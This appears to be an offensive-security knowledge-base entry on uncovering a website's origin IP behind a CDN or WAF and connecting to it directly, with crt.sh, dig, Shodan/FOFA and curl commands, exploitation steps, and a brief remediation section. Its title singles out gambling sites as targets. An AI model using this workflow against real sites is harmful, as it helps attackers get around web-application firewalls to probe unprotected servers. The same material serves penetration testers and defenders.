---
id: "origin-ip-leak-waf-bypass"
title: "Origin IP disclosure → direct access bypassing the WAF (essential for gambling sites)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (architectural flaw)"
severity: "critical"
cvss: 9
severity-basis: "cvss"
severity-note: null
product: "Any site behind a CDN/WAF"
versions: "Any"
ports: "80, 443, 8080"
keywords: "origin server, cdn, waf, bypass, real IP, origin access"
entry: "Origin disclosed through subdomains/email headers/certificate history/SSRF"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (reconnaissance methods)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

- Main-site response headers contain `server: cloudflare` / `x-cache` / `cf-ray`;
- Multiple application domains run on the same IP range.

## Prerequisites

- The target uses a CDN/WAF, but the origin has no origin-access ACL.

## PoC

```bash
# 1) Find the real IP using certificate transparency + historical DNS
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
dig +short mail.target.com            # Mail servers often connect directly to the origin
dig +short ftp.target.com cpanel.target.com direct.target.com

# 2) Use shodan/fofa syntax to find other IPs with the same body fingerprint
#   http.title:"turnkey gambling platform" or body:"<same-unique-JS-path>"
```

```bash
# 3) Connect directly to candidate IPs and compare page features (keep the domain in the Host header)
for ip in 1.2.3.4 5.6.7.8; do
  echo "== $ip"; curl -sk -H "Host: target.com" "https://$ip/" -o /dev/null -w '%{http_code} %{size_download}\n'
done
# Confirmation: 200 with a response size close to the CDN response = origin found; 403/timeout = origin-access ACL present
```

## Exploitation Steps

1. Start with step 1 (passive; no contact with the target);
2. Compare candidate IPs individually (step 3) to confirm the origin;
3. After connecting directly to the origin, repeat the earlier vulnerability checks—WAF rules usually do not cover the origin;
4. Evidence: differences between CDN and origin responses (size/headers).

## Remediation and Mitigation

- Allow only CDN origin-fetch IPs at the origin; prevent direct subdomain access; put mail/panels on separate IPs.
- Regularly assess real-IP exposure from an external perspective.

## References

- Public-source reconnaissance methods (crt.sh / SecurityTrails / FOFA).
